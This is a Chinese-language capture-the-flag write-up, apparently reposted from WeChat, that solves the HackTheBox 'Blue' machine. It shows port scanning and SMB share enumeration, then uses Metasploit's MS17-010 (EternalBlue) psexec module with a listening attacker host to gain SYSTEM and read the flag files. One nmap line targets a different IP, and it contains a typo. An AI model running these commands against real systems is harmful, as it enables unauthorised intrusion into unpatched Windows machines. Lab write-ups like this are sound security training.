> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/175AzFp6fRosKJ94FzrQqw)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquMoibLL3ZUGljx5V9GeT8ibGYYr30cJeIRLne96My6rVh3HHP07iaQ7Z3g/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Blue
```

靶场: HackTheBox.com

靶机名称: Blue

难度: 简单

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Kali 10.10.16.3
 
 靶机:10.10.10.40
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo masscan -p1-65535 -e tun0  10.10.10.40
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpqurZFtQk0sI7m5EhhSX3LGtSlVTa2cjIO7c1JnxSJOickroUKyibDT9FSQ/640?wx_fmt=png)

```
 sudo nmap -sC -sV -p 80,88,139,445,389,593,636 10.10.10.175 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquC5ltkIcBsR67Isaa38W8ic7ia3WGv5bIWXPYrr3mflysqQojibiau4WfSA/640?wx_fmt=png)

从扫描结果中看到靶机系统为 Windows7 7601，对 445 端口进行检测

SMB 服务渗透
--------

```
 smbclient -N -L 10.10.10.40
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquNAOC5pkVrxonxErPiaBicv1WsZiaByNdqKhPicAK1etYAdaeYn6zwkQpIw/640?wx_fmt=png)

发现共享目录

```
 smbmap -H 10.10.10.40 -u "0xdf" -p "0xdf"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquJnxnoSukQvtVrice5HibydInnlibNm5z6uoYJd4Y8HLdmYuc6LJnmLX7A/640?wx_fmt=png)

发现 Share 与 Users 两个目录可读，收集敏感信息

```
 smbclient //10.10.10.40/Share
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquAsia60AvRd3H2PKJLHCya3IgHgX6db99eEmkxE5aicibpobxo5dl1s6FQ/640?wx_fmt=png)

Share 目录为空，再来看看 Users 目录

```
smbclient //10.10.10.40/Users
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquy2tJBh0P0yKca4n2hTdC9icBjhQlXiab6rvkF7Sa6eYIu3pmCEicUcic4A/640?wx_fmt=png)

Users 共享目录下面有两个文件夹，但未找到敏感信息

nmap 扫描脚本漏洞

```
sudo nmap --script smb-vuln* 10.10.10.40 -p 445 -oN nmap-smb-vuln.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquMU8FpaQ9PvlibDdkaPzNppdOqa9Mg4UIiayTG7DUrECScVIHic6kxWmlA/640?wx_fmt=png)

又是 MS17-010，开启 msf 攻击

```
msfocnsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
set LHOST 10.10.16.3
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpqujOEHbPvKicBRhD9SNjCia2uQfKtqmYdiaGZgNHljlEqhuvjsicpYbWjicWQ/640?wx_fmt=png)

攻击成功，拿到 SYSTEM 权限

```
cd C:\Users
dir
type haris\desktop\user.txt
type administrator\desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquETlyl093QywpZF5LOp4ic5xdmQkYyTkuKsx3LJLvh71gicFONEsk2L0w/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquibXVqyYhoL9dQwAzMx6t6H3pjZwicq33jEHm5AdU3BXYpRIpSacHnRsQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpquyjdGG53qRIvFwASqAoExzF1EIia0TymKeLvQVs77nXTMicU6shnP3MJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUthuwMuekWx3Sib0I1sHqpqudAJRN9S4XPDFqU6d00EicntyFibOvaddlCO8f9fBTY3CdLjz4FiaLAELQ/640?wx_fmt=jpeg)